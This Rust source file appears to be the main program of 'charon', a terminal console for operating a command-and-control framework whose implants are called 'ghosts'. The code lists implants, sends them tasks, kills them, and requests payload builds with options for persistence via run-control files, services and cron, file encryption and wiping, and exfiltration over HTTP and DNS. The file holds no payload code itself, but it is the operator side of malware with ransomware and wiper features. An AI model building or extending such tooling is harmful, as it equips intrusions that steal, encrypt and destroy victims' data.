use charon::action::Action;
use charon::client::{C2Client, RealClient};
use charon::models::GhostBuildRequest;
use charon::state::AppState;
use charon::update::{self, Command};
use charon::ui;

use crossterm::{
    event::{self, DisableMouseCapture, EnableMouseCapture, Event as CEvent, KeyCode},
    execute,
    terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen}
};
use ratatui::{backend::CrosstermBackend, Terminal};
use std::io;
use std::sync::Arc;
use std::error::Error;
use std::time::{Duration, Instant};
use tokio::sync::mpsc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    enable_raw_mode()?;
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let client = Arc::new(RealClient::new());

    let (tx, mut rx) = mpsc::channel::<Action>(32);

    let mut app = AppState::default();
    let tick_rate = Duration::from_millis(250);
    let mut last_tick = Instant::now();

    loop {
        terminal.draw(|f| ui::draw(f, &app))?;

        let timeout = tick_rate
            .checked_sub(last_tick.elapsed())
            .unwrap_or_else(|| Duration::from_secs(0));

        if crossterm::event::poll(timeout)? {
            if let CEvent::Key(key) = event::read()? {
                let action = match key.code {
                    KeyCode::Char(c) => Action::Char(c),
                    KeyCode::Enter => Action::Enter,
                    KeyCode::Esc => Action::Esc,
                    KeyCode::Backspace => Action::Backspace,
                    KeyCode::Up => Action::Up,
                    KeyCode::Down => Action::Down,
                    KeyCode::Left => Action::Left,
                    KeyCode::Right => Action::Right,
                    KeyCode::Tab => Action::NextTab,
                    KeyCode::BackTab => Action::PrevTab,
                    _ => Action::Tick
                };

                if let Some(command) = update::update(&mut app, action) {
                    process_command(command, client.clone(), tx.clone()).await;
                }
            }
        }

        if let Ok(action) = rx.try_recv() {
            if let Some(command) = update::update(&mut app, action) {
                process_command(command, client.clone(), tx.clone()).await;
            }
        }

        if last_tick.elapsed() >= tick_rate {
            if let Some(command) = update::update(&mut app, Action::AutoRefresh) {
                process_command(command, client.clone(), tx.clone()).await;
            }

            update::update(&mut app, Action::Tick);
            last_tick = Instant::now();
        }
    }

    Ok(())
}

async fn process_command(cmd: Command, client: Arc<RealClient>, tx: mpsc::Sender<Action>) {
    match cmd {
        Command::FetchGhosts => {
            let c = client.clone();
            let t = tx.clone();
            tokio::spawn(async move {
                let res = c.fetch_ghosts().await;
                let _ = t.send(Action::ReceiveGhosts(res)).await;
            });
        },
        Command::FetchTasks(ghost_id) => {
            let c = client.clone();
            let t = tx.clone();
            tokio::spawn(async move {
                let res = c.fetch_tasks(&ghost_id).await;
                let _ = t.send(Action::ReceiveTasks(res)).await;
            });
        },
        Command::SendTask { ghost_id, req } => {
            let c = client.clone();
            let t = tx.clone();
            tokio::spawn(async move {
                let res = c.send_task(&ghost_id, req).await;
                let _ = t.send(Action::ReceiveTaskSendResult(res)).await;
            });
        },
        Command::UpdateGhostConfig { ghost_id, config } => {
            let c = client.clone();
            let t = tx.clone();
            tokio::spawn(async move {
                let res = c.update_config(&ghost_id, config).await;
                let _ = t.send(Action::ReceiveConfigUpdateResult(res)).await;
            });
        },
        Command::KillGhost(ghost_id) => {
            let c = client.clone();
            let t = tx.clone();
            tokio::spawn(async move {
                let res = c.kill_ghost(&ghost_id).await;
                let _ = t.send(Action::ReceiveKillResult(res)).await;
            });
        },
        Command::BuildPayload {
            url, port, debug,
            persistence, persist_runcontrol, persist_service, persist_cron,
            impact, impact_encrypt, encryption_algo, impact_wipe,
            exfil, exfil_http, exfil_dns
        } => {
            let c = client.clone();
            let t = tx.clone();
            
            let target_port = port.parse::<u16>().unwrap_or(9999).to_string();

            let req = GhostBuildRequest {
                target_url: url,
                target_port,
                enable_debug: debug,
                enable_persistence: persistence,
                persist_runcontrol,
                persist_service,
                persist_cron,
                enable_impact: impact,
                impact_encrypt,
                encryption_algo,
                impact_wipe,
                enable_exfil: exfil,
                exfil_http,
                exfil_dns
            };

            tokio::spawn(async move {
                let res = c.request_build(req).await;
                let _ = t.send(Action::ReceiveBuildResult(res)).await;
            });
        },
        Command::Quit => {
            let _ = disable_raw_mode();
            let _ = execute!(io::stdout(), LeaveAlternateScreen, DisableMouseCapture);
            std::process::exit(0);
        }
    }
}
